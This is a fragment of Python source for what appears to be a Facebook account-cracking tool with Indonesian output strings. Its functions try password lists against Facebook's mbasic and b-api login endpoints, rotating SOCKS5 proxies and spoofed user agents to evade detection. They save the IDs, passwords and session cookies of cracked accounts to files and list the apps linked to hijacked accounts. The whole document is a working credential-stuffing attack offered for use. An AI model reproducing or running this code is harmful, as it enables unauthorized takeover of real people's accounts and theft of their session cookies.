Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v7.0/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				print ("")
				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
				print ("")
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"}
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print ("")
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					print ("")
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print ("")
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					print ("")
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def free(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v7.0/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"}
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print ("")
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					print ("")
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1

def api(uiz,pwr):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		proxff= open('proxy_mat.txt','r').read().splitlines()
		cuukk=random.choice(proxff)
		proxs= {'http': 'socks5://'+cuukk}
		headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua, "content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
		response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uiz)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers,proxies=proxs) 
		if "session_key" in response.text and "EAAG" in response.text:
			print("\r %s*--> %s|%s %s• %s"%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
			open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+'\n')
			ok+=1
			break
		elif "www.facebook.com" in response.json()["error_msg"]:
			print("\r %s*--> %s|%s %s• %s"%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
			open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
			cp+=1
			break
		else:
			continue
	
	HikmatXD +=1


def opsi_detect(uiz,pw):
	global cp
	ua = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	from bs4 import BeautifulSoup as sop
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':uiz,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
		open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print(garis+H+" tap yes/a2f.. cek lagi akunnya login di fb lite ")
		else:
			for opsii in opsi:
				print('\r'+garis+'%s terdapat %s%s '%(P,K,opsii.text))
	except Exception as c:
		print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
		print('\r'+garis+'%s tidak dapat mengecek opsi... cek login di fb lite/mbasic '%(M))
		open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
		cp+=1
		
def cek_apk(ses,kuki):
	w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print('\r'+garis+M+' tidak ada apk aktif yang terkait ')
	else:
		print('\r'+garis+H+' aplikasi yang terkait : ')
		for i in range(len(game)):
			print("\r"+garis+" %s%s. %s%s"%(P,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),P))

	w=ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print('\r'+garis+M+' tidak ada apk kadaluarsa yang terkait ')
	else:
		print('\r'+garis+K+' aplikasi kadaluarsa yang terkait : ')
		for i in range(len(game)):
			print("\r"+garis+" %s%s. %s%s"%(P,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),P))
		else:
			print('\r') 


ex_run()
#cek_cookie()
